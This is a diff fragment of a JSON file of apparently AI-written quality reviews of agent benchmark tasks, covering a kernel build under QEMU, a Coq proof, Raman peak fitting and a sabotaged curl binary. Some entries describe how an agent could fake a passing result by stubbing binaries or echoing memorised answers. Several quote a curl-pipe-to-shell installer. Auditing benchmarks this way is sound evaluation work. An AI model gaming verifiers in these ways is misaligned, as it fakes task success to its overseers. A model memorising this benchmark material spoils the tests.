+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Battles use the `-f` fixed-position flag, and I confirmed via 5 repeated runs per opponent that the reference solution produces byte-identical 'Results:' lines every time; apt package versions in the Dockerfile are pinned and the uv/pytest versions used in run-tests.sh are also pinned."
+    },
+    {
+      "example": "winning-avg-corewars--after",
+      "directory": "task-0057",
+      "attempt": 1,
+      "group": "assumed_pass",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "Dockerfile:21-28 pins exact versions for every supporting apt package (e.g. `tmux=3.5a-3`) but Dockerfile:31-42 adds a floating `deb-src ... stable` line and runs unversioned `apt-get source pmars`, so a future Debian stable point-release could silently change the pmars binary that the razor-thin 75%/33% thresholds were tuned against (we measured the reference solution lands exactly on 75/100 and 33/100 with zero margin), even though apt-get source supports exact version pinning (`apt-get source pmars=0.9.4-1`)."
+    },
+    {
+      "example": "train-fasttext",
+      "directory": "task-0038",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "Empirical reproduction showed the accuracy check fails in roughly 1 of 4 identical runs because fastText's default multi-threaded SGD is unseeded and the achievable accuracy (~0.62 \u00b1 0.003) straddles the 0.62 threshold with almost no margin; additionally the Yelp dataset is downloaded from a mutable 'resolve/main' HEAD reference rather than a pinned commit/revision."
+    },
+    {
+      "example": "mteb-retrieve",
+      "directory": "task-0039",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The single instruction requirement (write the 5th-highest-similarity document's line to /app/result.txt) is exactly what test_outputs.py checks, with no extra untested requirements or tested-but-unstated requirements beyond standard BGE query-instruction usage, which is documented practice for this named model family."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "The test entry point (run-tests.sh) performs runtime network installs at verify time: `apt-get install -y curl`, `curl -LsSf https://astral.sh/uv/0.7.13/install.sh | sh`, and `uv pip install pytest==8.4.1` are all executed after the agent's turn, introducing exactly the kind of verify-time network flakiness the guidance calls out (these should be baked into the Dockerfile instead)."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh performs a genuine build (downloads linux-6.9, patches init/main.c, configures, compiles, builds the initramfs); I verified against the actual kernel source that `boot_cpu_hotplug_init();` (the sed anchor) is indeed inside `start_kernel()` in init/main.c for 6.9, confirming the patch lands correctly and the solution would pass the described test."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Building a custom Linux kernel, assembling an initramfs, and booting it under QEMU is a realistic systems/embedded-engineering task that kernel developers and build engineers are paid to do."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The test only checks the final boot-time dmesg output of the booted system at fixed deliverable paths; it does not enforce a particular build procedure beyond the artifact locations needed to reproduce the verifier's own qemu invocation."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "This is a single shared-mode container with full root access throughout; nothing prevents the agent from faking the result without ever building the modified kernel \u2014 e.g. replacing /usr/bin/qemu-system-x86_64 or the agent-authored /init (basic-init) script with a stub that merely echoes the expected login/shell/dmesg transcript the expect script pattern-matches on. The verifier never checks that the actual compiled kernel image contains the printk or that dmesg output is genuine."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The test boots the actual built kernel in QEMU and executes `dmesg | grep Hello` inside the live session, checking real program output rather than grepping source code."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Kernel version (6.9), busybox binary (1.31.0-defconfig-multiarch-musl), uv (0.7.13), and pytest (8.4.1) are all pinned; apt packages are left unpinned which is acceptable per guidance since standard mirrors don't retain historical versions."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Difficulty comes from genuine kernel configuration/build/boot engineering, not from arbitrary formatting or precision requirements."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The single test checks exactly what the instruction asks for (a boot-time message proving a from-source build with the specified printk), with no untested instruction requirements or extraneous test requirements."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The task requires many sequential environment interactions \u2014 installing toolchains, downloading and configuring kernel sources, building, assembling an initramfs, and iteratively verifying a QEMU boot \u2014 which cannot be done in a single zero-shot generation."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "A reviewer can inspect solution.sh and independently confirm the sed-based patch lands inside start_kernel by reading the downloaded kernel source, as verified during this review; no hardcoded expected values are used."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction is short, uses absolute paths, and reads as an informal human note; it names the exact qemu command and initramfs tool only insofar as needed to match the fixed artifact paths the verifier depends on, which is acceptable output-format specification."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh performs the actual build/compile/assembly steps rather than echoing a precomputed answer, and contains no large heredoc blocks that should be separate files."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The task's expected output is boot/log text, not a structured data format like JSON/CSV/API schema."
+    },
+    {
+      "example": "build-linux-kernel-qemu",
+      "directory": "task-0040",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "No typos found in filenames, paths, variable names, or commands across task.yaml, Dockerfile, init.sh, run-tests.sh, solution.sh, or the test file."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get install curl, then `curl -LsSf https://astral.sh/uv/... | sh` to install uv, then uv pip install pytest), which is exactly the flaky pattern the guidance warns against instead of baking test tooling into the image."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh writes a correct, complete proof (base case via plus_n_O, inductive case via IHn' and plus_n_Sm) and compiles it with coqc; an expert Coq user could do this in minutes, matching the stated expert_time_estimate_min of 5."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "Completing a partially-admitted Coq proof is a realistic (if entry-level) formal-verification activity that mirrors a classic teaching exercise (Software Foundations' plus_comm); formal methods engineers plausibly do this kind of work."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Tests only check the final file's content/compilability, not which tactics or tools were used; the instruction likewise only states the end goal (a completed, compiling proof), not a required procedure."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The decisive check recompiles the agent's file with coqc, so trick outputs (e.g. swapping Qed for Admitted, or leaving a bogus tactic) fail to compile or fail the required Qed./no-admit checks; the ground-truth solution is not present in the agent's image."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "test_compiled_proof_content actually re-invokes coqc as a subprocess and checks the exit code, which is genuine execution-based verification; the one supplementary string-based test (test_proof_contents) is secondary, not the primary gate."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "uv (0.7.13) and pytest (8.4.1) are version-pinned; Coq is installed via apt without a pin, which is acceptable since apt mirrors only carry current point releases; no mutable live service affects the proof content."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "What little difficulty exists comes from applying the right induction lemmas, not from output formatting or arbitrary precision requirements."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Instruction asks for a completed, compiling plus_comm.v producing plus_comm.vo; tests check exactly that (file exists, compiles, no admits, ends in Qed) with no extraneous requirements."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Correctness is mechanically checked by the Coq compiler itself, so a reviewer without deep Coq expertise can confirm the task works simply by running coqc, rather than having to manually judge a hardcoded expected value."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The instruction uses a bare relative filename (plus_comm.v / plus_comm.vo) instead of an absolute path, and the formulaic \"Your task is to: 1/2/3\" numbered list plus restated theorem text reads as generated boilerplate rather than a terse human-written prompt."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh writes out the actual corrected proof text and runs coqc to compile it for real, rather than faking or hardcoding a final result; the file is short enough to keep inline."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The task's deliverable is a Coq source/compiled file, not a structured data format like JSON/CSV/API output."
+    },
+    {
+      "example": "prove-plus-comm",
+      "directory": "task-0041",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "No typos found in filenames, paths, commands, or identifiers across the task files."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get update/install curl, curl -LsSf https://astral.sh/uv/... | sh, uv pip install pytest), which is exactly the pattern the guidance flags as introducing flakiness (network issues, rate limits) and should instead be baked into the image at build time."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "I reproduced solution.sh's fitting logic against task-deps/graphene.dat with the pinned numpy/scipy versions and got G=[1580.297, 9.061, 8382.692, 5561.035] and 2D=[2670.082, 17.520, 12314.417, 1239.092], matching the test's hardcoded expected values almost exactly and well within tolerance. The approach (parse odd decimal/tab format, unit-convert, Lorentzian curve_fit) is implementable by an expert in well under a few hours."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Fitting Lorentzian lineshapes to G/2D Raman peaks of graphene is a routine real analysis task for materials scientists/physicists characterizing 2D materials, so there is clear real-world utility."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction states only the desired end state (fitted parameters written to /app/results.json in a given schema) and the tests only check the resulting JSON values with tolerances, without mandating a specific tool, library, or step-by-step procedure."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The expected values (amplitude/offset in particular) are specific to this sample's raw intensity data and are not guessable from general knowledge of graphene Raman shifts; the test file with hardcoded expected values lives under tests/ which is not accessible to the agent at solve time, and the raw data file is the only thing exposed, which is the legitimate task input."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The tests execute by loading /app/results.json and numerically comparing fitted parameter values against expected floats with defined tolerances, rather than scanning source code or matching strings."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh pins numpy==2.3.1 and scipy==1.16.0, and run-tests.sh pins uv==0.7.13 and pytest==8.4.1; curve_fit on this fixed dataset with fixed initial guesses is deterministic, and I confirmed re-running it reproduces the hardcoded expected values (apt-get for curl is unpinned, which is acceptable per guidance since apt mirrors don't carry historical versions)."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The core difficulty is genuine: recognizing/parsing an unusual comma-decimal, tab-separated data format, converting wavelength to wavenumber, isolating peak regions, and performing a nonlinear Lorentzian fit \u2014 not clerical formatting, since the required output schema is simple and loosely toleranced."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The instruction asks for G and 2D peak x0/gamma/amplitude/offset written to /app/results.json in a specified schema, and the three tests check exactly the existence of that file and those four fields for each peak with no additional untested or unrequested requirements."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Solving requires exploring the environment to find and inspect the oddly-formatted data file, writing and running a conversion script, writing and running a fitting script, and checking the output \u2014 this cannot be done in a single zero-shot generation without executing and iterating in the terminal."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The hardcoded expected test values match (to the displayed precision) exactly what running solution.sh's fit.py produces, which I verified independently, indicating the ground truth was derived from the reference solution rather than fabricated, and the method is auditable by a reviewer with basic curve-fitting knowledge."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The instruction is short, reads as authentically human-written, states the goal upfront without prescribing an approach, uses an absolute output path (/app/results.json), and includes no unnecessary headings, roleplay, or tool/library hints."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "The solution performs genuine computation (format conversion plus a real curve_fit), but the ~63-line fit.py script is inlined as a heredoc inside solution.sh well beyond the ~20-line guidance threshold, where it should instead be a separate file."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "instruction.md explicitly spells out the normative JSON schema (G and 2D objects each with x0, gamma, amplitude, offset keys), not merely an example."
+    },
+    {
+      "example": "raman-fitting",
+      "directory": "task-0042",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "No typos were found in filenames, paths, commands, or variable names across task.yaml, Dockerfile, run-tests.sh, solution.sh, or tests/test_outputs.py."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get update/install, and `curl -LsSf https://astral.sh/uv/0.7.13/install.sh | sh` piped to shell) instead of baking these dependencies into the environment Dockerfile, introducing exactly the flakiness/reliability risk the guidance warns against."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh kills the live sabotage mechanisms (access-logger loop, cron job) and reinstalls curl via apt, which works because curl is never apt-installed elsewhere in the base image or task Dockerfile, so a plain `apt install -y curl` genuinely overwrites the corrupted file; this is achievable by an expert sysadmin within the stated time estimates."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Diagnosing and removing disguised persistence mechanisms (cron, at, sysvinit, hidden background loop) that are repeatedly sabotaging a system binary is a realistic sysadmin/incident-response troubleshooting scenario."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction only asks that curl be fixed, and the tests check end-state behavior (binary integrity and successful retrieval of real content) without mandating any particular tool or procedure."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "anti_cheat_robustness",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The Dockerfile (containing the exact sabotage mechanisms) is not copied into the running container and isn't accessible to the agent, and the ELF-magic + real-content checks force the agent to actually stop the processes that keep rewriting /usr/bin/curl rather than allowing a superficial stub to pass."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Tests execute the actual curl binary (checking ELF magic, --version output, and real retrieved content from example.com) rather than scanning source or keywords."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "Verification depends on live, unpinned network installs (apt-get update/install curl, uv installer script) and on reachability/content of an external live website (example.com) rather than stable, pinned infrastructure, risking inconsistent results across runs."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Difficulty comes from investigating and identifying multiple disguised persistence mechanisms, not from formatting or precision minutiae."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Solving requires multi-step system exploration (inspecting processes, cron, at jobs, init scripts, hidden files) and cannot be done via a single zero-shot generation."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The sabotage mechanisms and expected content are plain, readable shell/Dockerfile constructs and a literal, checkable HTML string, verifiable by a non-specialist without domain expertise."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction is a single short, human-sounding sentence using an absolute path (/usr/bin/curl) with no step-by-step hints, headings, or fluff."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "solution.sh performs genuine investigative/remediation commands (pkill, rm, apt install) rather than echoing a precomputed final answer, and is short enough not to need separate files."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The task does not require any structured output format; it only requires restoring working curl behavior."
+    },
+    {
+      "example": "cron-broken-network",
+      "directory": "task-0043",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "File paths and identifiers are consistent across the Dockerfile, solution.sh, and tests (e.g., /usr/share/misc/logs/access-logger, /tmp/.config/update/security_check), with no detected typos."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "verifiable",
+      "expected": "pass",
+      "observed": "fail",
+      "result": "mismatch",
+      "explanation": "run-tests.sh performs runtime network installs at verify time (apt-get update/install curl, curl|sh installing uv, uv pip install pytest) rather than baking these into the Dockerfile, which is exactly the flakiness pattern the guidance prohibits."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solvable",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The provided solution.sh never downloads the video or performs any transcription \u2014 it just echoes the exact precomputed answer line-by-line, so there is no actual demonstration that the described workflow (download + transcribe) is achievable within the 1800s agent timeout, especially since that timeout is shorter than the task's own 120-minute expert time estimate."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "interesting",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "Extracting structured action sequences from gameplay/video content (e.g., for archiving walkthroughs, bot training data, or documentation) is a plausible real-world data-extraction task, even if niche."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "outcome_verified",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction specifies only the end deliverable (/app/solution.txt with one move per line) and does not mandate specific tools or step-by-step procedures for downloading or transcribing."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "functional_verification",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The test reads the actual deliverable file and computes a content-similarity (Levenshtein) score against the expected transcript rather than grepping for keywords or patterns in source code."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "deterministic_reproducible",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The task's core requirement depends on a live, mutable external service (a specific YouTube video) rather than stable infrastructure like PyPI/apt \u2014 YouTube downloads are notoriously prone to breakage from throttling, anti-bot measures, region locks, or video removal, undermining reproducibility across runs."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "essential_difficulty",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The intended difficulty comes from genuinely watching/transcribing spoken or on-screen game commands from a video, not from arbitrary formatting precision; the Levenshtein-based scoring tolerates local insertions/deletions reasonably well."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "test_instruction_alignment",
+      "expected": "fail",
+      "observed": "pass",
+      "result": "mismatch",
+      "explanation": "The two tests (file existence and content similarity) map directly to the instruction's two requirements: create /app/solution.txt and have it contain the transcribed moves."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "agentic",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "As designed, the task requires multi-step tool use (installing a downloader, fetching video/audio, extracting and transcribing content, writing output) that cannot be done in a single LLM generation \u2014 though note the anti-cheat concern that memorized walkthroughs could bypass this in practice."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "reviewable",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "The ~280-line expected transcript is hardcoded in the test with no documentation of how it was derived or verified (e.g., timestamps, methodology); a non-specialist reviewer would need to manually watch the entire source video and cross-check every line to confirm correctness, which is impractical and unsupported by any provided derivation artifact."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "instruction_concision",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "The instruction is a single short paragraph, uses an absolute output path (/app/solution.txt), includes the necessary (otherwise undiscoverable) video URL, and does not prescribe a solution method or include extraneous headings/fluff."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "solution_quality",
+      "expected": "fail",
+      "observed": "fail",
+      "result": "match",
+      "explanation": "solution.sh consists entirely of echo statements writing the final answer text directly to solution.txt, with no download, audio/video processing, or transcription step \u2014 exactly the forbidden 'echo the final answer' pattern, not a genuine computation process."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "structured_data_schema",
+      "expected": "pass",
+      "observed": "not_applicable",
+      "result": "mismatch",
+      "explanation": "The expected output is plain text (one command per line); it is not structured data like JSON/CSV/an API schema requiring separate normative specification, and the instruction already gives representative examples of the line format."
+    },
+    {
+      "example": "extract-moves-from-video",
+      "directory": "task-0044",
+      "attempt": 1,
+      "group": "upstream",
+      "criterion": "typos",
+      "expected": "pass",
+      "observed": "pass",
+      "result": "match",
+      "explanation": "No typos were found in filenames, paths, commands, or variable names across task.yaml, Dockerfile, docker-compose.yaml, run-tests.sh, solution.sh, or tests/test_outputs.py."
+    },
+    {
+      "example": "nginx-request-logging",
+      "directory": "task-0045",
+      "attempt": 1,
